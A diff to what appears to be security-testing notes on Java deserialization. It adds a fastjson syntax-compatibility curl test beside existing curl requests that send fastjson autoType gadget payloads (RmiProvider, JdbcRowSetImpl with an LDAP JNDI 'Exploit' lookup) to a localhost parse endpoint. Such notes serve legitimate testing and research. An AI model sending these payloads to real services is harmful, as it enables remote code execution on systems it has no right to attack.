@@ -90,6 +90,9 @@ rm -f test
 curl 127.0.0.1:8080/fastjson/parse -d 'json={"@type":"org.apache.commons.proxy.provider.remoting.RmiProvider","host":"127.0.0.1",port:"1099","name":"Exploit"}'
 
 curl 127.0.0.1:8080/fastjson/parse -d 'json={"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/Exploit","autoCommit":true}'
+
+# 语法兼容性测试
+curl 127.0.0.1:8080/fastjson/parse -d 'json={,,,,"user":"123",,,,,"111":222}'
 ```
 
 #### jackson
